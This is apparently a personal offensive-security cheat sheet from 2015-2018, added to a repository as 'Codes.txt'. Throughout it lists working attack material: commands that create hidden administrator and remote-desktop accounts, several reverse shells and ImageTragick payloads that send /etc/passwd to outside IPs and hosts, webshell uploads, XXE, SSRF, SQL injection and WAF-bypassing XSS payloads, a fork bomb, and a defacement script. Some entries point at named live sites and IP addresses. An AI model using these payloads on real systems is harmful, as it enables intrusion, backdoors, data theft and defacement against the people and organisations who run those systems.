@@ -1,0 +1,1511 @@
+============================================
+ Codes.txt - Shawar Khan
+ Personal Collection of 2015-2018
+============================================
+
+==RDP info==
+http://213.7.229.70
+psexec -a  \\localhost cmd
+
+net user d4rk d4rk.0aA /add && net localgroup "Administrators" d4rk /add && net localgroup "Remote Desktop Users" d4rk /add
+
+net user d4rk 123456.0aA /add && net localgroup "Administrators" d4rk /add && net localgroup "Remote Desktop Users" d4rk /add
+
+netsh advfirewall firewall add rule name="Zoo TCP Port 80" dir=in action=allow protocol=TCP localport=1337
+netsh advfirewall firewall add rule name="Zoo TCP Port 80" dir=out action=allow protocol=TCP localport=1337
+
+https://github.com/OffS3c/eSMTP
+
+
+http://86.48.174.178.static.wline.lns.sme.cust.swisscom.ch:8080
+
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh advfirewall firewall add rule name="Open Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
+
+18.188.31.218
+
+
+aws ls without authentication
+aws s3 ls s3://bucket-name --no-sign-request
+
+[+] SSRF:
+    SSH(scp://,sftp://)
+        scp
+        sftp
+        pop3
+        imap
+        smtp
+        ftp
+        dict
+        gopher
+        tftp
+        file
+        php
+        zlib
+        data
+        glob
+        phar
+        ssh2
+        expect
+
+http://[::1]/
+http://[::]/
+http://0177.1/
+http://0x7f.1/
+http://127.000.000.1/
+https://520968996/
+http://0.0.0.0/
+http://0000::1/
+http://127.127.127.127/
+http://127.0.1.3/
+http://0/
+
+file:///etc/passwd
+file://\/\/etc/passwd
+
+
+        
+[+] Remote Code Execution:
+    Jboss JMX Remote Code Execution
+    Imagemagick with jpeg
+    imagemagic(svg/mvg): image Over 0,0 1,1 'url(https:";curl 52.173.185.194:1337")'
+    SVG RCE
+    PUT Method RCE
+    ffmpeg
+    .mp4 RCE: 
+        #EXTM3U
+        #EXT-X-MEDIA-SEQUENCE:0
+        #EXTINF:10.0,
+        http://yngwie.ru/2.mp4
+        #EXT-X-ENDLIST
+
+    .avi read:
+        #EXTM3U
+        #EXT-X-MEDIA-SEQUENCE:0
+        #EXTINF:10.0,
+        concat:http://yngwie.ru/header.m3u8|file:///etc/passwd
+        #EXT-X-ENDLIST
+
+jenkins exploit rce /script:
+"ls /".execute().text
+
+
+URL Bar spoofing:
+<script>
+    window.onclick = function () {
+        x = window.open('https://www.google.com/csi');
+        setTimeout(function () {
+            x.document.write(`I am not a www.google.com;<button onclick="alert('I can run JS on this page!')">click me</button>`)
+        }, 100);
+    }
+</script>
+
+
+imagemagick imagetragick exploits:
+
+test.jpg(sends a get request)
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg "|curl http://box.shawarkhan.com")'
+pop graphic-context
+
+
+test.jpg(reads etc passwd)
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg "|wget --post-file /etc/passwd http://box.shawarkhan.com")'
+pop graphic-context
+
+
+test.jpg(writes data to /tmp/shawar.txt)
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg "|whoami>>/tmp/shawar.txt")'
+pop graphic-context
+
+test.jpg(sends shawar.txt to host)
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg "|wget --post-file /tmp/shawar.txt box.shawarkhan.com")'
+pop graphic-context
+
+
+CORS exploit:
+<html>
+<script>
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ws.infogram.com/socket.io/?EIO=3&transport=polling&t=MH7BU79',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
+</script>
+</html>
+
+
+File read via protocol:
+<head>
+    <script>
+        function show() {
+            var file = link.import.querySelector('body')
+            alert(file.innerHTML)
+        }
+    </script>
+    <link id="link" href="brave:///etc/passwd" rel="import" as="document" onload="show()" />
+</head>
+
+
+sqlite3 payload for enumerating columns:
+x' || (SELECT user FROM xde43_users));--
+
+XSS WAF bypass:
+
+F5 Silverline <details open Ontoggle=confirm`1`>
+Cloudflare WAF <a href="jav%09ascript:alert(1)">
+Amazon Cloudfront <a href="jav%09as%26%2399ript:alert(1)">
+Akamai Kona <x Onbeforescriptexecute=n=confirm,n(1)>
+Imperva Incapsula <details open ontoggle=window/* */["loca"%2B"tion"]='Javascr'%2B'ipt:confir'%2B'm`1`'>
+
+<script src="data:,alert(1)%250A-->
+
+ASP XSS:
+%u003csvg onload=alert(1)>
+%u3008svg onload=alert(2)>
+%uff1csvg onload=alert(3)>
+<svg/onload=u=URL,l=u.length,location=/javascrip/.source%2Bu[1]%2Bu[4]%2B/alert/.source%2Bu[l-2]%2b1%2Bu[l-1]>#()
+<video/src/id="onerror"onloadstart=top[id]=confirm;throw"1337">
+
+Buddy Press XSS : Tags : &lt;svg/onload=alert(1)//
+
+?url1=http: //brutelogic.com.br@google.com
+?url2=http: //brutelogic.com.br:@google.com
+
+alert(1) = []['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()
+
+XSS fetch js =  fetch('URL_TO_FETCH').then((resp)=>resp.text()).then(function(data){alert(data)})
+location file inclusion lfi
+LFI: ../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd
+LFI to RCE: php://filter/convert.base64-encode/resource=index
+PD9waHAgZWNobygkX0dFVFsneCddKTsgLy8gT01HIHlvdSBib3RoZXJlZCB0byBkZWNvZGUgYmFzZSA2ND8gPz4=
+LFI with base64: php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+
+SAP Central Process Scheduling by Redwood: /scheduler/ui/js/4c540510/UIUtilJavaScriptJS?../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd
+
+CKEDITOR server read: /ckeditor/kcfinder/browse.php?type=images&CKEditor=editor1&CKEditorFuncNum=3&langCode=en
+
+===Cache===
+web.archive.org/cdx/search/cdx?url=rajiv.dev.paltalk.com/*&output=html&fl=original&collapse=urlkey
+http://index.commoncrawl.org/CC-MAIN-2017-09-index?url=*.paltalk.com%2f*&output=json
+archive.li
+===Werkzeug=====:
+http://139.196.123.168:8081/console
+
+
+censys 443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names%3A+dji.com
+
+Werkzeug Debugger RCE: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("176.223.139.201",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+Upload Amazon AWS S3 bucket: aws s3 cp login.html s3://$bucketName --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers
+Wordpress Users API: https://news.kucoin.com/wp-json/wp/v2/users
+https://rizmi.daraz.pk/storage/productsync/index.php data=ls -la - daraz shell
+
+Activity start android: am start -n com.jiojiome/.activity.ChannelAdmin
+
+backdoor: bash -i >& /dev/tcp/176.223.139.201/1338 0>&
+enable ports: https://www.digitalocean.com/community/tutorials/how-to-set-up-a-basic-iptables-firewall-on-centos-6 iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT    
+public_html check: u=$(awk -F':' '{ print $1}' /etc/passwd);for i in $u;do d="/home/$i/public_html/";if [[ -r $d ]] ;then echo readable: $d;fi ;done
+
+SQL Update query: UPDATE traegerschaft set name = 'Bümpliz', mail = 'info@kitafantasia.ch' where id = '06d938d9-223c-40d3-b06b-f5243e30e1a0';
+UPDATE `marketing_sources_campaigns` SET `campaign_image` = '/6b/i60066c9f0e5d90a48a4108532dlnderj9ru.jpg' WHERE `id` = '3'
+shodan
+censys
+https://whois.arin.net/ui/query.do
+https://apps.db.ripe.net/db-web-ui/%23/fulltextsearch
+%.whatsapp.com - crt.sh
+http://dnscheck.iis.se/
+https://completedns.com/dns-history/
+http://dnshistory.org/
+http://whoisrequest.org/history/
+
+[url=google.com:/onclick='alert(document.domain)'[url=]]xss[/url]
+reverseip: http://api.hackertarget.com/reverseiplookup/?q=199.201.64.30
+
+Blind XSS:
+"><script src=https://shawarkhan.xss.ht></script>"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc2hhd2Fya2hhbi54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+"><script src=https://darkfear.xss.ht></script>"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGFya2ZlYXIueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>
+
+Censys:
+443.https.tls.certificate.parsed.subject.organization:
+
+CRLF other than firefox: https://hackerone.com/redirect?signature=fe2dc1dbc84a4656d5ad6cffc3c4c0ca0226391c&url=https%3A%2F%2Fmonitor.sjc.dropbox.com%2Fcrlf%250dSet-Cookie%3Atest%3Dtest%3Bdomain%3D.dropbox.com
+new mysqli(
+"><svg/onload=alert(1)>{{'4'*4}}${alert(1)} 
+
+Target uses CloudFlare.
+> Activate super 1337 mode.
+> dig -t TXT target
+
+jira: mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com
+rest/api/2/serverInfo
+odoo.site.com/web/database/manager
+
+atlassian exploit: 
+
+Check Trello for Creds
+
+Accessing misconfigured data of an org:
+  
+https://storage.googleapis.com/<org-name>
+
+Unauthorized access to org's google groups:
+
+https://groups.google.com/a/<domain-name>
+
+Obtaining possible users linked with target org: 
+
+https://github.com/search?type=Users&q=<org-name>
+
+Accessing unprotected GitLab projects: 
+
+GitLab-portal/explore
+
+ /secure/ManageFilters.jspa - check jira
+ /explore - Gitlab instance auth bypass
+
+ if dir lisiting in git:
+    wget --mirror -I .git TARGET.COM/.git/ 
+    git status
+    git checkout
+    git checkout -- .
+    
+IMP git files:
+    HEAD
+    objects/info/packs
+    description
+    config
+    COMMIT_EDITMSG
+    index
+    packed-refs
+    refs/heads/master
+    refs/remotes/origin/HEAD
+    refs/stash
+    logs/HEAD
+    logs/refs/heads/master
+    logs/refs/remotes/origin/HEAD
+    info/refs
+    info/exclude
+
+
+.git testing:
+
+.git/refs/heads/master/HASH
+.git/objects/first_two_digits_of_hash/HASH
+download the object
+cat object - wont work
+git cat-file -p theHASH
+
+
+if no dir listing in git:
+    master hash:
+        cat .git/refs/heads/master 
+        output:
+        6916ae52c0b20b04569c262275d27422fc4fcd34
+        
+    confirming commit:
+	.git/objects/69/16ae52c0b20b04569c262275d27422fc4fcd34 
+        git cat-file -t 6916ae52c0b20b04569c262275d27422fc4fcd34
+        output:
+        commit
+    
+    capturing commit:
+        git cat-file -p 6916ae52c0b20b04569c262275d27422fc4fcd34 
+        output:
+        tree fa3887a0b798346c122afdd7c5ecc605bf3c18c0
+        parent 9264d57c621f66208d689ef653ce8a62c3bccfae
+        author XY <foo@bar> 1429391394 +0200
+        committer XY <foo@bar> 1429391394 +0200
+
+    analysing tree object:
+        git cat-file -p fa3887a0b798346c122afdd7c5ecc605bf3c18c0
+        output:
+        040000 tree 532fc6055e09e0a2d5602f4b84c0dbadce1b5f3e        Dumper
+        040000 tree 077ce769dedcf19d0f063246256e8ae0394fd8df        Extractor
+        040000 tree d6e1bd4677a256e760cce5ddaa7db7ea6f9a8900        Finder
+        100644 blob 9670cf17dfeec351c395493058044b9f9dadbe2a        README.md
+
+    capturing blob data:
+        git cat-file -p 9670cf17dfeec351c395493058044b9f9dadbe2a
+
+    finding packets:
+         cat .git/objects/info/packs 
+         output:
+         P pack-e38660e6be24bb79d8d929ddea3d194e0dd3cd13.pack
+
+        packet locations:
+        ls .git/objects/pack/
+        pack-e38660e6be24bb79d8d929ddea3d194e0dd3cd13.idx
+        pack-e38660e6be24bb79d8d929ddea3d194e0dd3cd13.pack
+
+    unpacking packets:
+        git unpack-objects -r < .git/objects/pack/pack-e38660e6be24bb79d8d929ddea3d194e0dd3cd13.pack
+
+
+===================
+testing SVN
+
+/.svn/entries
+/.svn/text-base/search-emp.php.svn-base
+/.svn/text-base/index.php.svn-base
+.svn/pristine/00/001761b07f92b4c9053ce2878cc338b8e06fc3a7.svn-base
+.svn/wc.db
+
+sqlite3 wc.db 'select local_relpath, checksum from NODES'
+
+sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;'
+
+index.php|.svn/pristine/4e/4e6a225331f9ae872db25a8f85ae7be05cea6d51.svn-base
+scripts/menu.js|.svn/pristine/fa/fabeb3ba6a96cf0cbcad1308abdbe0c2427eeebf.svn-base
+style/style.js|.svn/pristine/2s/2cc5590e0ba024c3db77a13896da09b39ea74799.svn-base
+
+/.svn/pristine/4e/4e6a225331f9ae872db25a8f85ae7be05cea6d51.svn-base
+
+
+http://site.com/.svn/text-base/admin.jsp.svn-base
+/.svn/all-wcprops
+===================
+RCE
+&& wget http://box.shawarkhan.com/d.html
+
+
+Style based XSS
+ background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+
+
+sitemap.xml java XXE
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE urlset [
+ <!ENTITY % goodies SYSTEM "file:///etc/hostname">
+ <!ENTITY % dtd SYSTEM "http://dtd.webhooks.pw/files/combine.dtd">
+%dtd;
+]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
+   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+   xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+    <url>
+        <loc>http://location.webhooks.pw/resp/&xxe;</loc>
+        <lastmod>2006-11-18</lastmod>
+        <changefreq>daily</changefreq>
+        <priority>0.8</priority>
+    </url>
+</urlset>
+
+
+.git testing:
+
+.git/refs/heads/master/HASH
+.git/objects/first_two_digits_of_hash/HASH
+download the object
+cat object - wont work
+git cat-file -p theHASH
+
+http://web.archive.org/cdx/search/cdx?url=*.site.com/*&output=json&fl=original&collapse=urlkey
+
+exploitable SSRF protocols:
+scp
+sftp
+pop3
+imap
+smtp
+ftp
+dict
+gopher
+tftp
+file
+php
+zlib
+data
+glob
+phar
+ssh2
+expect
+scp
+sftp
+pop3
+imap
+smtp
+ftp
+dict
+gopher
+tftp
+file
+php
+zlib
+data
+glob
+phar
+ssh2
+expect
+
+
+<img src="
+
+scp://52.173.185.194:1337
+sftp://52.173.185.194:1337
+pop3://52.173.185.194:1337
+imap://52.173.185.194:1337
+smtp://52.173.185.194:1337
+ftp://52.173.185.194:1337
+dict://52.173.185.194:1337
+gopher://52.173.185.194:1337
+tftp://52.173.185.194:1337
+file://52.173.185.194:1337
+
+
+?url=sftp://evil.com:1111/
+connection from 127.0.0.1
+SSH-2.0-libssh2_1.4.2
+
+
+imagemagick svg/mvg:
+image Over 0,0 1,1 'url(https:";curl 52.173.185.194:1337")'
+
+Apache Struts 2 Detection:
+Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Qualys-Struts',5*5)}.multipart/form-data
+
+%3Ca+href%3D%22%01java%03script%3Aconfirm%28document.domain%29%22%3EClick+to+execute%3Ca%3E%0D%0A
+javascript:confirm(document.domain)">Click+to+execute<a>
+
+
+SVG RCE:
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>
+function readTextFile(file)
+{
+    var rawFile = new XMLHttpRequest();
+    rawFile.open("GET", file, false);
+    rawFile.onreadystatechange = function ()
+    {
+        if(rawFile.readyState === 4)
+        {
+            if(rawFile.status === 200 || rawFile.status == 0)
+            {
+                var allText = rawFile.responseText;
+                alert(allText);
+            }
+        }
+    }
+    rawFile.send(null);
+}
+readTextFile("file:///../../../../../../../../../etc/passwd");
+</script>
+</svg>
+
+
+
+Archives:
+http://web.archive.org/web/*/addepar.com/*
+cache:
+http://cachedview.com/
+
+lynx -listonly -dump site.com
+
+{"user_id": "5755 and sleep(12)=1", "receiver": "value"}
+
+Nmap Host Discovery Quick:
+nm.scan(hosts='127.0.0.1 192.168.8.103',arguments=' -sn -n -T5',callback=callback_result)
+
+Python single line loop:
+[(i) for i in s]
+
+PUT method RCE:
+curl -v -X PUT -d '<?php echo shell_exec($_GET["cmd"]);?>' http://site.com/test/shawar.php
+
+PHP Mailer RCE:
+name: <?php echo "shawarkhan"; ?>
+email: vulnerables@ -OQueueDirectory=/tmp -X/var/www/html/shawarkhan.php
+vulnerables@ -OQueueDirectory=/tmp -X/var/www/codedecode.com.br/htdocs/shawarkhan.txt
+
+
+event handlers:
+oncut
+onblur
+oncopy
+ondrag
+ondrop
+onhelp
+onload
+onplay
+onshow
+onabort
+onclick
+onclose
+onended
+onerror
+onfocus
+oninput
+onkeyup
+onpaste
+onpause
+onreset
+onwheel
+onbounce
+oncancel
+onchange
+onfinish
+ononline
+onresize
+onscroll
+onsearch
+onseeked
+onselect
+onsubmit
+ontoggle
+onunload
+oncanplay
+ondragend
+onemptied
+onfocusin
+oninvalid
+onkeydown
+onmessage
+onmouseup
+onoffline
+onplaying
+onseeking
+onstalled
+onstorage
+onsuspend
+onwaiting
+onactivate
+ondblclick
+ondragover
+onfocusout
+onkeypress
+onmouseout
+onpagehide
+onpageshow
+onpopstate
+onprogress
+ontouchend
+onbeforecut
+oncuechange
+ondragenter
+ondragleave
+ondragstart
+onloadstart
+onmousedown
+onmousemove
+onmouseover
+ontouchmove
+onafterprint
+onbeforecopy
+ongestureend
+onhashchange
+onloadeddata
+onmouseenter
+onmouseleave
+onmousewheel
+onratechange
+ontimeupdate
+ontouchstart
+onafterupdate
+onbeforepaste
+onbeforeprint
+oncontextmenu
+ondevicelight
+onmspointerup
+ontouchcancel
+onanimationend
+onautocomplete
+onbeforeunload
+onbeforeupdate
+ondevicemotion
+ongesturestart
+onmsgestureend
+onmsgesturetap
+onmspointerout
+onvolumechange
+oncontrolselect
+ongesturechange
+onmsgesturehold
+onmspointerdown
+onmspointermove
+onmspointerover
+ontransitionend
+onuserproximity
+onanimationstart
+onbeforeactivate
+oncanplaythrough
+ondurationchange
+onlanguagechange
+onloadedmetadata
+onmsgesturestart
+onmsinertiastart
+onmspointerenter
+onmspointerhover
+onmspointerleave
+onbeforeeditfocus
+ondeviceproximity
+onmsgesturechange
+onmspointercancel
+onbeforedeactivate
+onreadystatechange
+onautocompleteerror
+ondeviceorientation
+onorientationchange
+onanimationiteration
+onmozfullscreenerror
+onmsgesturedoubletap
+onwebkitanimationend
+onwebkitmouseforceup
+onmozfullscreenchange
+onmozpointerlockerror
+onwebkittransitionend
+onmozpointerlockchange
+onwebkitanimationstart
+onwebkitmouseforcedown
+onwebkitwillrevealbottom
+oncompassneedscalibration
+onwebkitmouseforcechanged
+onwebkitanimationiteration
+onwebkitmouseforcewillbegin
+
+
+XHR:
+fetch('http://google.com')
+a.open("GET","https://www.google.com.pk/shawarkhan",0);a.send();a.responseText
+
+CRLF: %0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
+
+alert:
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top["al"+"ert"](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top['al\145rt'](1)
+top['al\x65rt'](1)
+top[8680439..toString(30)](1)
+[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()
+
+low length:
+<base href=//0>
+
+$ while:; do echo "alert(1)" | nc -lp80; done
+
+marquee:
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+
+RANDOM:
+x contenteditable onblur=alert(1)>lose focus!
+<x onclick=alert(1)>click this!
+<x oncopy=alert(1)>copy this!
+<x oncontextmenu=alert(1)>right click this!
+<x oncut=alert(1)>copy this!
+<x ondblclick=alert(1)>double click this!
+<x ondrag=alert(1)>drag this!
+<x contenteditable onfocus=alert(1)>focus this!
+<x contenteditable oninput=alert(1)>input here!
+<x contenteditable onkeydown=alert(1)>press any key!
+<x contenteditable onkeypress=alert(1)>press any key!
+<x contenteditable onkeyup=alert(1)>press any key!
+<x onmousedown=alert(1)>click this!
+<x onmousemove=alert(1)>hover this!
+<x onmouseout=alert(1)>hover this!
+<x onmouseover=alert(1)>hover this!
+<x onmouseup=alert(1)>click this!
+<x contenteditable onpaste=alert(1)>paste here!
+
+%3Cx onxxx=1
+<%78 onxxx=1
+<x %6Fnxxx=1
+<x o%6Exxx=1
+<x on%78xx=1
+<x onxxx%3D1
+	<X onxxx=1
+<x OnXxx=1
+<X OnXxx=1
+
+Doubling
+<x onxxx=1 onxxx=1
+
+	<x/onxxx=1
+<x%09onxxx=1
+<x%0Aonxxx=1
+<x%0Conxxx=1
+<x%0Donxxx=1
+<x%2Fonxxx=1 
+
+Pwnage:
+Browser:
+<svg onload=setInterval(function(){with(document)body.
+appendChild(createElement('script')).src='//HOST:PORT'},0)>
+
+$ while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
+
+mobile:
+<svg onload=alert(navigator.connection.type)>
+<svg onload=alert(navigator.battery.level)>
+<svg onload=alert(navigator.battery.dischargingTime)>
+<svg onload=alert(navigator.battery.charging)>	<svg onload=navigator.vibrate(500)>
+<svg onload=navigator.vibrate([500,300,100])>
+
+<iframe src=LOGOUT_URL onload=forms[0].submit()>
+</iframe><form method=post action=LOGIN_URL>
+<input name=USERNAME_PARAMETER_NAME value=USERNAME>
+<input name=PASSWORD_PARAMETER_NAME value=PASSWORD>
+
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+
+<script src="data:&comma;alert(1)//
+"><script src=data:&comma;alert(1)//
+
+<script src="//shawarkhan.com.br&sol;1.js&num;
+"><script src=//shawarkhan.com.br&sol;1.js&num;
+
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+
+
+No handlers:
+<script>alert(1)</script>
+<script src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(1)>click
+<math><brute href=javascript:alert(1)>click
+<form action=javascript:alert(1)><input type=submit>
+<isindex action=javascript:alert(1) type=submit value=click>
+<form><button formaction=javascript:alert(1)>click
+<form><input formaction=javascript:alert(1) type=submit value=click>
+<form><input formaction=javascript:alert(1) type=image value=click>
+<form><input formaction=javascript:alert(1) type=image src=SOURCE>
+<isindex formaction=javascript:alert(1) type=submit value=click>
+<object data=javascript:alert(1)>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<svg><script xlink:href=data:,alert(1) />
+<math><brute xlink:href=javascript:alert(1)>click
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+
+with handlers:
+<html ontouchstart=alert(1)>
+<html ontouchend=alert(1)>
+<html ontouchmove=alert(1)>
+<html ontouchcancel=alert(1)>
+<body onorientationchange=alert(1)>
+
+eval alternative:
+setTimeout
+
+Blind XXE:
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://52.173.185.194/"> ]> <GeneralSearch>&dtgmlf6ent;</GeneralSearch> 
+
+
+XXE Testing:
+<!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY file SYSTEM "file:///etc/passwd"> 
+]>
+
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+
+
+
+octals: []['\155\141\160']['\143\157\156\163\164\162\165\143\164\157\162']('\143\157\156\146\151\162\155\50\61\51')()
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("52.173.185.194",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+/bin/sh | nc <your IP> <any unfiltered port>
+
+Folk bomb: 
+used in linux for DoS"
+:(){ :|:& };:
+
+Jboss manual exploitation:
+/usr/share/jboss-autopwn/e.sh
+
+directory fuzzers
+dirsearch
+dirb
+
+HTTP Response spliting:
+%E5%98%8A%E5%98%8DSet-Cookie:%20test
+%0d%0aSet-Cookie:+test
+
+0day XSS:
+https://rockwellautomation.custhelp.com/app/error/error_id/404/url/%2Fapp%2Fanswers%2Fprint%2Fa_id%2F40913
+
+XSS Angular JS:
+{{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+'; astNode.argument={type:'Identifier',name:'foo'}; "); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }}
+
+y parameter crop remote code execution rce 0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-
+Payload:0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-
+
+plink 173.214.173.151 -P 8080 -telnet | cmd.exe | plink 173.214.173.151 -P 8888 -telnet
+
+Method 1: with netcat-bsd 1.89 it only works without -p
+nc -l -n -vv 8080
+
+Method 2 Victim: in the Video it’s
+mknod backpipe p && telnet 127.0.0.1 8080 0<backpipe | /bin/bash 1>backpipe
+mknod backpipe p && /bin/sh 0</tmp/backpipe | nc pentestbox 443 1>/tmp/backpipe
+mkfifo ._b; nc -lk 4201 0<._b | /bin/bash &>._b;
+
+
+Background task:
+screen thecommandhere
+CTRL+A CTRL+D
+to get back, screen -r
+
+mkfifo pipe && nc remote_server 1337 <pipe | /bin/bash &>pipe
+
+
+bash -i >& /dev/tcp/176.223.139.201/80 0>&1
+
+RCE/SSTI Payload:
+Remote Code Execution RCE Intel
+RCE/SSTI on Intel. if you now the site is using the AngularJS then there maybe a chance of RCE/SSTI. Here's what i found during the 2nd research on intel. SSTI - Payload - Edit the profile section and changed my first name with the payload {php}$s=file_get_contents(‘/etc/passwd’);var_dump($s);{/php}. and Last name with {{9*9}}. But i was unable to see any change so finally decided test the vulnerability by requesting the password reset. Here is what i found when opened my gmail. Did you notice something? check the last name which is now 81. Short Writeup
+
+Payload:
+{php}$s=file_get_contents(‘/etc/passwd’);var_dump($s);{/php}
+<% import os;x=os.popen('id').read(); %>{{x}}
+
+Payload:
+{{668.5*2}}
+{{5+5}}}
+
+autofocus/onfocus='setTimeout`[document.domain,document.cookie].sort\u{28}prompt\u{29}`
+<a href='showthread.asp?id=0'><link href=http://lovern.doomby.com/medias/files/css.css rel=stylesheet>;--</a>
+92.222.71.224/easy.php?xss=<a/onblur=alert(document.domain)>s
+
+concatenation
+/ale/.source+/rt/.source
+document.getElementById(%27supersecret%27).innerHTML
+
+CRLF injection: %0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Ccenter%3E%3Ch1%3EHacked%3C/h1%3E%3C/center%3E
+
+http://directory.financialservicesonline.com.au/-44' union all SELECT CONCAT(table_name,'>',GROUP_CONCAT(column_name)),2,3,4,5,6,7,8,9,10,11,12,13,14,15 FROM information_schema.columns WHERE table_schema=database() GROUP BY table_name LIMIT 0,1--+/
+
+defacement XSS paylaod: "><script>document.body.innerHTML="<style>body{visibility:hidden;background:black;font-family:Verdana;margin:250px}</style><div style=visibility:visible;text-align:center;color:lime><p style=font-size:30px>XSSed By Shawar Khan</p><p style=color:lime;font-size:20px>./logout</p></div>";</script>
+
